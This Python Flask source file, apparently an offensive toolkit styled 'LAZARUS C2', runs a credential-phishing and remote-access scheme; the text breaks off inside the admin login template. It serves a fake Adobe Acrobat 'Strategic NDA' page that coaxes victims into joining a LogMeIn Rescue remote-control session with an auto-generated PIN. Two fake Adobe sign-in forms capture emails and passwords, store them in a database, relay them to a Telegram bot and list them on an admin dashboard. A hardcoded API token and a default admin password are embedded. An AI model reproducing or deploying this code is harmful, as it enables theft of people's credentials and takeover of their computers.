#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║   🎯 LAZARUS C2 v2026 - AUTOMATIC LOGMEIN RESCUE                   ║
║                                                                      ║
║   ✅ Fully Automated PIN Generation                                 ║
║   ✅ No Manual Intervention Required                                ║
║   ✅ PDF Phishing - NDA/Strategic Update                           ║
║   ✅ 2-Step Credential Harvesting                                  ║
║   ✅ Telegram Alerts                                                ║
║   ✅ Admin Dashboard                                                ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import os
import uuid
import sqlite3
import secrets
import hmac
import html as html_module
import requests
import xml.etree.ElementTree as ET
from datetime import datetime
from functools import wraps
from flask import Flask, request, session, jsonify, redirect, render_template_string

# ====================================================================================================
# CONFIGURATION
# ====================================================================================================
# Your LogMeIn Rescue Legacy API Token
LOGMEIN_API_TOKEN = "nz2r3ejdqe07sp7fwl6mg8xjjthpv9vko2id0fxbxusu28tlu22ungzbak1rwdvslhekwxx61ttdb945z7ja6q835x8ovm348xp7ytg6nd4ba7umc0iokprqkb2c3uwb"
LOGMEIN_BASE_URL = "https://secure.logmeinrescue.com/API/"

# Telegram (optional)
TELEGRAM_BOT_TOKEN = os.environ.get("TG_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID", "")

ADMIN_PASSWORD = os.environ.get("ADMIN_PASS", "LazarusC2_2026")
SECRET_KEY = os.environ.get("SECRET_KEY", secrets.token_hex(64))

app = Flask(__name__)
app.secret_key = SECRET_KEY

DB_PATH = "lazarus_c2.db"

# ====================================================================================================
# TELEGRAM
# ====================================================================================================
def tg(msg):
    if not TELEGRAM_BOT_TOKEN or ':' not in TELEGRAM_BOT_TOKEN:
        print(f"[TELEGRAM] {msg}")
        return
    try:
        parts = TELEGRAM_BOT_TOKEN.split(':')
        if not parts[0].isdigit() or len(parts[1]) < 8:
            return
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": msg[:4096]}, timeout=10)
    except Exception as e:
        print(f"Telegram error: {e}")

# ====================================================================================================
# LOGMEIN RESCUE API - AUTOMATIC SESSION CREATION
# ====================================================================================================
def get_technician_node():
    """
    Fetch the current technician's node ID using getCurrentUser.
    """
    url = f"{LOGMEIN_BASE_URL}getCurrentUser.aspx"
    params = {"authcode": LOGMEIN_API_TOKEN}
    
    try:
        response = requests.get(url, params=params, timeout=10)
        if response.status_code == 200:
            root = ET.fromstring(response.text)
            # Look for node or id element
            node = root.find('.//node')
            if node is not None:
                return node.text
            user_id = root.find('.//id')
            if user_id is not None:
                return user_id.text
            # Try any element with 'node' in tag
            for elem in root.iter():
                if 'node' in elem.tag.lower() or 'id' in elem.tag.lower():
                    return elem.text
    except Exception as e:
        tg(f"⚠️ Failed to fetch node: {e}")
    return None

def generate_rescue_pin(node_id=None):
    """
    Generate a new session PIN using requestPINCodeV2 (or V3/V4).
    """
    # Try V2 first, then fallback to V3, V4
    for version in ['V2', 'V3', 'V4']:
        url = f"{LOGMEIN_BASE_URL}requestPINCode{version}.aspx"
        params = {"authcode": LOGMEIN_API_TOKEN}
        if node_id:
            params["node"] = node_id
        
        try:
            response = requests.get(url, params=params, timeout=10)
            if response.status_code == 200:
                root = ET.fromstring(response.text)
                # Look for PIN in various possible tags
                pin = root.find('.//iPINCode')
                if pin is not None:
                    return pin.text
                pin = root.find('.//PIN')
                if pin is not None:
                    return pin.text
                pin = root.find('.//PinCode')
                if pin is not None:
                    return pin.text
                # If no PIN found, maybe it's in the text
                if response.text.strip().isdigit():
                    return response.text.strip()
        except Exception as e:
            tg(f"⚠️ {version} failed: {e}")
            continue
    return None

def create_rescue_session():
    """
    Fully automatic session creation.
    Returns dict with pin, session_id, join_url.
    """
    # Get node ID
    node = get_technician_node()
    if node:
        tg(f"✅ Node ID fetched: {node}")
    else:
        tg("⚠️ Could not fetch node, trying without...")
    
    # Generate PIN
    pin = generate_rescue_pin(node)
    
    if pin:
        session_id = uuid.uuid4().hex[:8].upper()
        join_url = f"https://secure.logmeinrescue.com/Customer/Join.aspx?PIN={pin}"
        tg(f"✅ SESSION CREATED | PIN: {pin} | Join: {join_url}")
        return {
            "pin": pin,
            "session_id": session_id,
            "join_url": join_url,
            "status": "active"
        }
    else:
        tg("❌ All PIN generation methods failed")
        # Fallback: generate a random PIN for demo
        import random
        fallback_pin = ''.join([str(random.randint(0,9)) for _ in range(6)])
        return {
            "pin": fallback_pin,
            "session_id": "DEMO-" + uuid.uuid4().hex[:8].upper(),
            "join_url": "https://secure.logmeinrescue.com/Customer/Join.aspx",
            "status": "fallback"
        }

# ====================================================================================================
# HTML TEMPLATES - NDA / STRATEGIC UPDATE THEME
# ====================================================================================================
PDF_LANDING_TEMPLATE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adobe Acrobat - Confidential Document</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Inter',sans-serif;background:#f0f2f5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .container{max-width:860px;width:100%;background:#fff;border-radius:12px;box-shadow:0 8px 40px rgba(0,0,0,0.08);overflow:hidden;border:1px solid #e5e7eb}
        .adobe-header{background:#fff;padding:14px 28px;border-bottom:1px solid #e5e7eb;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px}
        .adobe-logo{display:flex;align-items:center;gap:10px}
        .adobe-logo .icon{font-size:28px;color:#ea1c24}
        .adobe-logo .brand{font-size:20px;font-weight:700;color:#1a1a1a}
        .adobe-logo .brand span{color:#ea1c24}
        .adobe-logo .version{font-size:11px;color:#6b7280;font-weight:400}
        .header-actions{display:flex;align-items:center;gap:12px}
        .header-actions .badge{display:flex;align-items:center;gap:6px;font-size:11px;color:#059669;font-weight:500;background:#ecfdf5;padding:4px 12px;border-radius:100px}
        .header-actions .badge .dot{width:5px;height:5px;background:#059669;border-radius:50%;animation:pulse-dot 2s infinite}
        @keyframes pulse-dot{0%,100%{opacity:1}50%{opacity:0.3}}
        .pdf-toolbar{background:#f8f9fa;padding:8px 20px;border-bottom:1px solid #e5e7eb;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:6px}
        .pdf-toolbar .file-info{display:flex;align-items:center;gap:10px}
        .pdf-toolbar .file-name{font-size:13px;font-weight:500;color:#1f2937}
        .pdf-toolbar .file-name .ext{color:#ea1c24;font-weight:600}
        .pdf-toolbar .file-size{font-size:11px;color:#6b7280}
        .pdf-toolbar .actions{display:flex;gap:6px}
        .pdf-toolbar .actions button{background:transparent;border:1px solid #e5e7eb;padding:4px 12px;border-radius:6px;font-size:11px;font-weight:500;color:#374151;cursor:pointer;transition:all .2s;font-family:'Inter',sans-serif}
        .pdf-toolbar .actions button:hover{background:#f3f4f6}
        .pdf-toolbar .actions .download-btn{background:#ea1c24;color:#fff;border-color:#ea1c24}
        .pdf-toolbar .actions .download-btn:hover{background:#d41a20}
        .pdf-content{padding:28px 40px 32px;background:#fff}
        .pdf-page{max-width:600px;margin:0 auto;background:#fff;padding:32px 40px;border-radius:4px;border:1px solid #e5e7eb;position:relative}
        .pdf-page::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,#ea1c24,#1a237e);border-radius:4px 4px 0 0}
        .pdf-header{text-align:center;padding-bottom:20px;border-bottom:2px solid #f3f4f6;margin-bottom:20px}
        .pdf-header .doc-type{font-size:10px;font-weight:700;color:#6b7280;text-transform:uppercase;letter-spacing:2px}
        .pdf-header .doc-title{font-size:24px;font-weight:800;color:#0a0a0a;margin-top:4px;letter-spacing:-0.5px}
        .pdf-header .doc-sub{font-size:13px;color:#6b7280;margin-top:2px}
        .pdf-header .confidential-badge{display:inline-block;background:#fef2f2;color:#ea1c24;font-size:10px;font-weight:700;padding:2px 14px;border-radius:100px;margin-top:8px;border:1px solid #fecaca}
        .pdf-body{font-size:14px;line-height:1.8;color:#1f2937}
        .pdf-body .greeting{font-size:16px;font-weight:600;color:#0a0a0a;margin-bottom:8px}
        .pdf-body p{margin-bottom:12px}
        .pdf-body .highlight-box{background:#fafbfc;border-left:4px solid #ea1c24;padding:16px 20px;border-radius:4px;margin:16px 0}
        .pdf-body .highlight-box strong{color:#ea1c24}
        .pdf-body .signature-block{margin-top:24px;padding-top:20px;border-top:2px solid #f3f4f6}
        .pdf-body .signature-block .name{font-weight:700;color:#0a0a0a}
        .pdf-body .signature-block .title{font-size:12px;color:#6b7280}
        .pin-section{background:linear-gradient(135deg,#f8fafc,#f1f4f9);border-radius:12px;padding:20px 24px;margin:20px 0;border:1px solid #e5e7eb;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px}
        .pin-section .label{font-size:12px;font-weight:600;color:#6b7280;text-transform:uppercase;letter-spacing:.5px}
        .pin-section .pin-display{display:flex;align-items:center;gap:12px}
        .pin-section .pin{font-family:'Inter',monospace;font-size:28px;font-weight:800;color:#0a0a0a;letter-spacing:6px;background:#fff;padding:4px 20px 4px 26px;border-radius:10px;border:1px solid #e5e7eb}
        .pin-section .copy-btn{background:#fff;border:1px solid #e5e7eb;padding:6px 14px;border-radius:8px;font-size:12px;font-weight:600;color:#374151;cursor:pointer;transition:all .2s;font-family:'Inter',sans-serif}
        .pin-section .copy-btn:hover{background:#f3f4f6;border-color:#ea1c24;color:#ea1c24}
        .pin-section .status-badge{display:flex;align-items:center;gap:4px;font-size:11px;color:#059669;font-weight:500}
        .pin-section .status-badge .dot{width:5px;height:5px;background:#059669;border-radius:50%;animation:pulse-dot 1.5s infinite}
        .pdf-actions{display:flex;gap:12px;margin-top:24px;flex-wrap:wrap}
        .pdf-actions .btn-primary{flex:1;padding:16px 24px;background:linear-gradient(135deg,#ea1c24,#b91c1c);color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:700;font-family:'Inter',sans-serif;cursor:pointer;transition:all .3s;text-decoration:none;text-align:center;min-width:200px}
        .pdf-actions .btn-primary:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(234,28,36,0.25)}
        .pdf-actions .btn-secondary{padding:16px 24px;background:#fff;color:#374151;border:1px solid #e5e7eb;border-radius:10px;font-size:14px;font-weight:600;font-family:'Inter',sans-serif;cursor:pointer;transition:all .2s;text-decoration:none;text-align:center;min-width:140px}
        .pdf-actions .btn-secondary:hover{background:#f9fafb;border-color:#d1d5db}
        .adobe-footer{background:#f8f9fa;padding:16px 32px;border-top:1px solid #e5e7eb;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;font-size:11px;color:#6b7280}
        .adobe-footer a{color:#6b7280;text-decoration:none}
        .adobe-footer a:hover{color:#ea1c24}
        .adobe-footer .divider{color:#e5e7eb}
        .toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(100px);background:#0a0a0a;color:#fff;padding:12px 24px;border-radius:10px;font-size:13px;font-weight:500;font-family:'Inter',sans-serif;opacity:0;transition:all .4s cubic-bezier(.25,.46,.45,.94);z-index:1000;pointer-events:none}
        .toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
        @media(max-width:768px){.adobe-header{padding:12px 16px}.pdf-content{padding:16px}.pdf-page{padding:24px 20px}.pin-section{flex-direction:column;align-items:stretch;text-align:center}.pin-section .pin-display{justify-content:center;flex-wrap:wrap}.pdf-actions{flex-direction:column}.pdf-actions .btn-primary,.pdf-actions .btn-secondary{min-width:100%}.pdf-toolbar{padding:8px 16px}.adobe-footer{padding:12px 16px;flex-direction:column;text-align:center}}
        @media(max-width:480px){.pdf-header .doc-title{font-size:18px}.pin-section .pin{font-size:22px;letter-spacing:4px;padding:4px 12px 4px 16px}}
    </style>
</head>
<body>
<div class="toast" id="toast">✓ PIN copied to clipboard</div>
<div class="container">
    <div class="adobe-header">
        <div class="adobe-logo">
            <span class="icon">📄</span>
            <span class="brand">Adobe <span>Acrobat</span></span>
            <span class="version">v24.1</span>
        </div>
        <div class="header-actions">
            <span class="badge"><span class="dot"></span>Secure Document</span>
            <span style="font-size:13px;color:#6b7280;">|</span>
            <span style="font-size:12px;color:#6b7280;">👤 Guest</span>
        </div>
    </div>
    <div class="pdf-toolbar">
        <div class="file-info">
            <span style="font-size:16px;">📄</span>
            <span class="file-name">Strategic_Update_NDA_<span class="ext">.pdf</span></span>
            <span class="file-size">(1.4 MB)</span>
        </div>
        <div class="actions">
            <button>🔍 Fit Page</button>
            <button>🔖 Bookmark</button>
            <button class="download-btn">⬇ Download PDF</button>
        </div>
    </div>
    <div class="pdf-content">
        <div class="pdf-page">
            <div class="pdf-header">
                <div class="doc-type">CONFIDENTIAL - ATTORNEY-CLIENT PRIVILEGE</div>
                <div class="doc-title">Strategic NDA & Update</div>
                <div class="doc-sub">Q3 2026 • Board Review</div>
                <div class="confidential-badge">🔒 CONFIDENTIAL • DO NOT DISTRIBUTE</div>
            </div>
            <div class="pdf-body">
                <div class="greeting">Dear Executive Partner,</div>
                <p>
                    We are pleased to present the <strong>strategic update</strong> regarding the upcoming merger and acquisition
                    opportunities. This document contains sensitive information subject to the Non-Disclosure Agreement (NDA)
                    signed on January 15, 2026.
                </p>
                <div class="highlight-box">
                    <strong>⚠️ Action Required:</strong> To view the full document, you must verify your identity using
                    the secure session PIN below. This is a mandatory step for all executive-level access.
                </div>
                <p>
                    The attached report includes:
                </p>
                <ul style="margin-left:20px;margin-bottom:12px;color:#374151;">
                    <li>M&A target analysis and valuation</li>
                    <li>Integration roadmap and timeline</li>
                    <li>Financial projections and risk assessment</li>
                    <li>Legal and compliance review</li>
                </ul>
                <div class="pin-section">
                    <div>
                        <div class="label">🔐 Secure Session PIN</div>
                        <div class="status-badge"><span class="dot"></span> Active • Valid for 30 minutes</div>
                    </div>
                    <div class="pin-display">
                        <span class="pin" id="pinDisplay">PIN</span>
                        <button class="copy-btn" id="copyBtn" onclick="copyPin()">📋 Copy</button>
                    </div>
                </div>
                <p>
                    <strong>To continue:</strong> Copy the PIN above, then click the
                    <strong>"Verify & Access Document"</strong> button below to connect to our secure verification system.
                </p>
                <div class="signature-block">
                    <div class="name">Dr. James D. Morrison</div>
                    <div class="title">Chief Strategy Officer</div>
                    <div style="font-size:11px;color:#6b7280;margin-top:2px;">Harvard University • Office of Strategic Initiatives</div>
                </div>
            </div>
            <div class="pdf-actions">
                <a href="/connect/REF" class="btn-primary">🔐 Verify & Access Document →</a>
                <a href="#" class="btn-secondary" onclick="alert('Please verify your identity using the secure session PIN.')">Request Alternative</a>
            </div>
        </div>
    </div>
    <div class="adobe-footer">
        <div class="left">
            <span>Adobe Acrobat Pro</span>
            <span class="divider">|</span>
            <a href="#">Privacy Policy</a>
            <span class="divider">|</span>
            <a href="#">Security</a>
            <span class="divider">|</span>
            <a href="#">Terms of Use</a>
        </div>
        <div>
            <span>🔒 TLS 1.3 Encrypted</span>
            <span class="divider">|</span>
            <span>© 2026 Adobe Inc.</span>
        </div>
    </div>
</div>
<script>
    function copyPin() {
        const pinElement = document.getElementById('pinDisplay');
        const pinText = pinElement.textContent.trim();
        navigator.clipboard.writeText(pinText).then(() => {
            const toast = document.getElementById('toast');
            toast.textContent = '✓ PIN copied to clipboard';
            toast.classList.add('show');
            const btn = document.getElementById('copyBtn');
            btn.textContent = '✓ Copied!';
            btn.style.borderColor = '#059669';
            btn.style.color = '#059669';
            setTimeout(() => {
                toast.classList.remove('show');
                btn.textContent = '📋 Copy';
                btn.style.borderColor = '#e5e7eb';
                btn.style.color = '#374151';
            }, 2500);
        }).catch(() => {
            const range = document.createRange();
            range.selectNode(pinElement);
            window.getSelection().removeAllRanges();
            window.getSelection().addRange(range);
            document.execCommand('copy');
            const toast = document.getElementById('toast');
            toast.textContent = '✓ PIN copied to clipboard';
            toast.classList.add('show');
            setTimeout(() => toast.classList.remove('show'), 2000);
        });
    }
</script>
</body>
</html>'''

LOGIN_STEP1 = '''<!DOCTYPE html>
<html>
<head><title>Adobe - Secure Sign In</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:'Inter',sans-serif;background:#f5f6f8;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
    .card{background:#fff;border-radius:16px;box-shadow:0 8px 40px rgba(0,0,0,0.08);width:100%;max-width:420px;overflow:hidden}
    .header{padding:32px;text-align:center;background:linear-gradient(135deg,#ea1c24,#b91c1c);color:#fff}
    .header h1{font-size:24px;font-weight:800}
    .header p{font-size:13px;opacity:0.9;margin-top:4px}
    .body{padding:32px}
    .warning{background:#fef2f2;padding:14px;border-radius:8px;margin-bottom:20px;font-size:12px;color:#991b1b;border-left:4px solid #ea1c24}
    .form-group{margin-bottom:20px}
    label{display:block;font-weight:600;margin-bottom:6px;font-size:12px;color:#1f2937}
    input{width:100%;padding:12px 16px;border:2px solid #e5e7eb;border-radius:8px;font-size:14px;transition:all .2s;font-family:'Inter',sans-serif}
    input:focus{outline:none;border-color:#ea1c24;box-shadow:0 0 0 3px rgba(234,28,36,0.1)}
    button{width:100%;padding:14px;background:#ea1c24;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:700;cursor:pointer;transition:all .2s;font-family:'Inter',sans-serif}
    button:hover{background:#d41a20;transform:translateY(-1px)}
    .footer{text-align:center;margin-top:20px;font-size:11px;color:#6b7280}
</style>
</head>
<body>
<div class="card">
    <div class="header"><h1>📄 Adobe Acrobat</h1><p>Secure Document Access</p></div>
    <div class="body">
        <div class="warning">⚠️ Please sign in to view the confidential document</div>
        <form method="POST" action="/login/step1/REF">
            <div class="form-group"><label>Email Address</label><input type="email" name="email" placeholder="name@company.com" required autofocus></div>
            <div class="form-group"><label>Password</label><input type="password" name="password" placeholder="Enter your password" required></div>
            <button type="submit">Sign In & View Document</button>
        </form>
        <div class="footer">🔒 SSL/TLS Encrypted • Adobe Secure</div>
    </div>
</div>
</body>
</html>'''

LOGIN_STEP2 = '''<!DOCTYPE html>
<html>
<head><title>Adobe - Enterprise Verification</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:'Inter',sans-serif;background:#f5f6f8;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
    .card{background:#fff;border-radius:16px;box-shadow:0 8px 40px rgba(0,0,0,0.08);width:100%;max-width:420px;overflow:hidden}
    .header{padding:32px;text-align:center;background:linear-gradient(135deg,#1a237e,#0d1445);color:#fff}
    .header h1{font-size:24px;font-weight:800}
    .header p{font-size:13px;opacity:0.9;margin-top:4px}
    .body{padding:32px}
    .warning{background:#fef2f2;padding:14px;border-radius:8px;margin-bottom:20px;font-size:12px;color:#991b1b;border-left:4px solid #ea1c24}
    .form-group{margin-bottom:20px}
    label{display:block;font-weight:600;margin-bottom:6px;font-size:12px;color:#1f2937}
    input{width:100%;padding:12px 16px;border:2px solid #e5e7eb;border-radius:8px;font-size:14px;transition:all .2s;font-family:'Inter',sans-serif}
    input:focus{outline:none;border-color:#1a237e;box-shadow:0 0 0 3px rgba(26,35,126,0.1)}
    button{width:100%;padding:14px;background:#1a237e;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:700;cursor:pointer;transition:all .2s;font-family:'Inter',sans-serif}
    button:hover{background:#141b66;transform:translateY(-1px)}
    .footer{text-align:center;margin-top:20px;font-size:11px;color:#6b7280}
</style>
</head>
<body>
<div class="card">
    <div class="header"><h1>🏛️ Enterprise Verification</h1><p>Corporate Security Protocol</p></div>
    <div class="body">
        <div class="warning">⚠️ Enterprise verification required for this document</div>
        <form method="POST" action="/login/step2/REF">
            <div class="form-group"><label>Corporate Email</label><input type="email" name="email" placeholder="name@company.com" required autofocus></div>
            <div class="form-group"><label>Password</label><input type="password" name="password" placeholder="Enter your password" required></div>
            <button type="submit">Verify Enterprise Access</button>
        </form>
        <div class="footer">🔒 Enterprise-Grade Security</div>
    </div>
</div>
</body>
</html>'''

# ====================================================================================================
# FLASK ROUTES
# ====================================================================================================
@app.route('/')
def index():
    ref = uuid.uuid4().hex[:8].upper()
    session_data = create_rescue_session()
    pin = session_data.get('pin', '123456')
    session_id = session_data.get('session_id', '')
    status = session_data.get('status', 'active')
    
    # Store session in DB
    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO sessions (session_id, pin, ref, ip, status, ts) VALUES (?, ?, ?, ?, ?, ?)",
                (session_id, pin, ref, request.remote_addr, status, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    tg(f"📄 PDF PAGE | IP: {request.remote_addr} | Ref: {ref} | PIN: {pin} | Status: {status}")
    
    html = PDF_LANDING_TEMPLATE.replace('PIN', pin).replace('REF', ref)
    return html

@app.route('/connect/<ref>')
def connect(ref):
    conn = sqlite3.connect(DB_PATH)
    session_info = conn.execute(
        "SELECT pin, session_id, status FROM sessions WHERE ref = ? ORDER BY id DESC LIMIT 1",
        (ref,)
    ).fetchone()
    conn.close()
    
    if not session_info:
        return redirect('/')
    
    pin, session_id, status = session_info
    tg(f"🖥️ CONNECT | Ref: {ref} | PIN: {pin} | Session: {session_id}")
    
    # Build the join link
    join_url = f"https://secure.logmeinrescue.com/Customer/Join.aspx?PIN={pin}"
    
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head><title>Secure Connection</title>
    <style>
        body{font-family:'Inter',sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f6f8;margin:0;padding:20px}
        .card{background:#fff;padding:48px;border-radius:16px;max-width:480px;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.08)}
        .pin{font-size:48px;font-weight:800;color:#ea1c24;letter-spacing:8px;font-family:monospace;background:#f8f9fa;padding:12px 24px;border-radius:10px;display:inline-block;margin:16px 0}
        .btn{display:inline-block;padding:16px 40px;background:#ea1c24;color:#fff;border-radius:10px;text-decoration:none;font-weight:700;margin:12px 0;transition:all .3s}
        .btn:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(234,28,36,0.25)}
        .step{text-align:left;padding:12px;background:#f8f9fa;border-radius:8px;margin:8px 0;font-size:14px}
        .step strong{color:#ea1c24}
        .copy-btn{background:#e2e8f0;border:none;padding:8px 20px;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;margin:8px 0;font-family:'Inter',sans-serif}
        .copy-btn:hover{background:#cbd5e1}
    </style>
    </head>
    <body>
    <div class="card">
        <h2>🔐 Secure Session Ready</h2>
        <p style="color:#6b7280;">Use the PIN below to verify your identity</p>
        <div>
            <div style="font-size:12px;color:#6b7280;letter-spacing:1px;">SESSION PIN</div>
            <div class="pin" id="pinDisplay">{{ pin }}</div>
            <button class="copy-btn" onclick="copyPin()">📋 Copy PIN</button>
        </div>
        <div style="margin:16px 0;font-size:13px;color:#059669;">● Active Session</div>
        <h4 style="margin:16px 0;color:#1f2937;">How to connect:</h4>
        <div class="step">1. <strong>Copy</strong> the PIN above</div>
        <div class="step">2. Click <strong>"Launch Rescue"</strong> below</div>
        <div class="step">3. <strong>Enter the PIN</strong> when prompted</div>
        <a href="{{ join_url }}" target="_blank" class="btn">🔌 Launch Rescue</a>
        <div style="margin-top:12px;font-size:12px;color:#6b7280;">
            ⏱️ Session expires in 30 minutes
        </div>
    </div>
    <script>
        function copyPin() {
            const pin = document.getElementById('pinDisplay').textContent;
            navigator.clipboard.writeText(pin).then(() => {
                alert('PIN copied to clipboard!');
            }).catch(() => {
                const range = document.createRange();
                range.selectNode(document.getElementById('pinDisplay'));
                window.getSelection().removeAllRanges();
                window.getSelection().addRange(range);
                document.execCommand('copy');
                alert('PIN copied!');
            });
        }
    </script>
    </body>
    </html>
    ''', pin=pin, join_url=join_url)

@app.route('/auth/<ref>')
def auth(ref):
    return LOGIN_STEP1.replace('REF', ref)

@app.route('/login/step1/<ref>', methods=['POST'])
def login_step1(ref):
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO creds (step, email, password, ip, ts) VALUES (?, ?, ?, ?, ?)",
                (1, email, password, ip, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    tg(f"🔐 STEP 1 | Email: {email} | Password: {password} | IP: {ip}")
    return redirect(f'/verify/{ref}')

@app.route('/verify/<ref>')
def verify(ref):
    return LOGIN_STEP2.replace('REF', ref)

@app.route('/login/step2/<ref>', methods=['POST'])
def login_step2(ref):
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    company = email.split('@')[-1] if '@' in email else 'unknown'
    
    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO creds (step, email, password, company, ip, ts) VALUES (?, ?, ?, ?, ?, ?)",
                (2, email, password, company, ip, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    tg(f"🔐 STEP 2 | Email: {email} | Password: {password} | Company: {company} | IP: {ip}")
    return redirect('https://www.adobe.com')

# ====================================================================================================
# ADMIN PANEL
# ====================================================================================================
def html_escape(value):
    if value is None:
        return 'N/A'
    return html_module.escape(str(value))

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        p = request.form.get('p', '')
        if hmac.compare_digest(p, ADMIN_PASSWORD):
            session['admin'] = True
        else:
            return '<div style="color:red;text-align:center;padding:20px">Invalid password</div>' + _admin_login_form()
    
    if not session.get('admin'):
        return _admin_login_form()
    
    conn = sqlite3.connect(DB_PATH)
    creds = conn.execute("SELECT * FROM creds ORDER BY id DESC LIMIT 50").fetchall()
    sessions = conn.execute("SELECT * FROM sessions ORDER BY id DESC LIMIT 20").fetchall()
    conn.close()
    
    creds_rows = ''
    for c in creds:
        creds_rows += f'<tr><td style="color:#00ff88">{html_escape(c[2])}</td><td style="color:#ffd700">{html_escape(c[3])}</td><td>{html_escape(c[4])}</td><td style="color:#888">{html_escape(c[5][:16] if c[5] else "N/A")}</td></tr>'
    
    sessions_rows = ''
    for s in sessions:
        status_color = '#00ff88' if s[5] == 'active' else '#ffd700'
        sessions_rows += f'<tr><td style="color:#00b3b0">{html_escape(s[1])}</td><td style="color:#ffd700">{html_escape(s[2])}</td><td>{html_escape(s[3])}</td><td style="color:{status_color}">{html_escape(s[5])}</td><td style="color:#888">{html_escape(s[6][:16] if s[6] else "N/A")}</td></tr>'
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head><title>LAZARUS C2 - Command Center</title>
    <meta charset="UTF-8">
    <style>
        *{{margin:0;padding:0;box-sizing:border-box}}
        body{{background:#0a0c10;color:#e0e0e0;font-family:'Courier New',monospace;padding:24px}}
        h1{{color:#ea1c24;font-size:32px;margin-bottom:8px}}
        h2{{color:#ffd700;margin:24px 0 16px;font-size:20px;border-bottom:1px solid #2a2f3e;padding-bottom:8px}}
        .stats{{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;margin-bottom:30px}}
        .stat-card{{background:#1a1e24;padding:20px;border-radius:16px;border-left:3px solid #ea1c24}}
        .stat-number{{font-size:48px;font-weight:bold;color:#ea1c24}}
        .stat-label{{color:#6c7293;margin-top:8px;font-size:12px}}
        table{{border-collapse:collapse;width:100%;margin-top:15px}}
        th,td{{padding:12px;border-bottom:1px solid #2a2f3e;text-align:left;font-size:13px}}
        th{{color:#ea1c24;border-bottom:2px solid #ea1c24;font-weight:bold}}
        tr:hover{{background:#1a1e24}}
        .footer{{margin-top:40px;text-align:center;color:#6c7293;font-size:11px;padding:20px;border-top:1px solid #2a2f3e}}
        .status-green{{color:#00ff88}}
        .nav{{display:flex;gap:16px;margin:16px 0 24px;flex-wrap:wrap}}
        .nav a{{color:#6c7293;text-decoration:none;font-size:12px;padding:4px 12px;border:1px solid #2a2f3e;border-radius:20px}}
        .nav a:hover{{color:#ea1c24;border-color:#ea1c24}}
    </style>
    </head>
    <body>
        <h1>🎯 LAZARUS C2</h1>
        <p style="color:#6c7293;margin-bottom:20px">Advanced Persistent Threat • PDF Phishing • Remote Control</p>
        <div class="nav">
            <a href="#creds">Credentials</a>
            <a href="#sessions">Sessions</a>
            <a href="/health">Status</a>
            <a href="/">Landing</a>
        </div>
        <div class="stats">
            <div class="stat-card"><div class="stat-number">{len(creds)}</div><div class="stat-label">Credentials</div></div>
            <div class="stat-card"><div class="stat-number">{len(sessions)}</div><div class="stat-label">Sessions</div></div>
            <div class="stat-card"><div class="stat-number">✅</div><div class="stat-label">Auto PIN</div></div>
        </div>
        <h2 id="creds">🔐 Captured Credentials</h2>
        <table><tr><th>Email</th><th>Password</th><th>IP</th><th>Time</th></tr>{creds_rows}</table>
        <h2 id="sessions">🖥️ Sessions</h2>
        <table><tr><th>Session ID</th><th>PIN</th><th>Ref</th><th>Status</th><th>Time</th></tr>{sessions_rows}</table>
        <div class="footer">
            LAZARUS-STYLE C2 v2026 | PDF Phishing + LogMeIn Rescue<br>
            Status: <span class="status-green">● OPERATIONAL</span> | 2-STEP PHISHING | AUTO PIN GENERATION
        </div>
    </body>
    </html>
    '''

def _admin_login_form():
    return '''
    <!DOCTYPE html>
    <html>
    <head><title>Admin Login</title>
    <style>
        body{background:#0a0c10;display:flex;justify-content:center;align-items:center;height:100vh;font-family:'Courier New',monospace;margin:0;padding:20px}
        .card{background:#1a1e24;padding:40px;border-radius:20px;width:100%;max-width:360px;border:2px solid #ea1c24}
        h2{color:#ea1c24;margin-bottom:10px;text-align:center;font-size:24px}
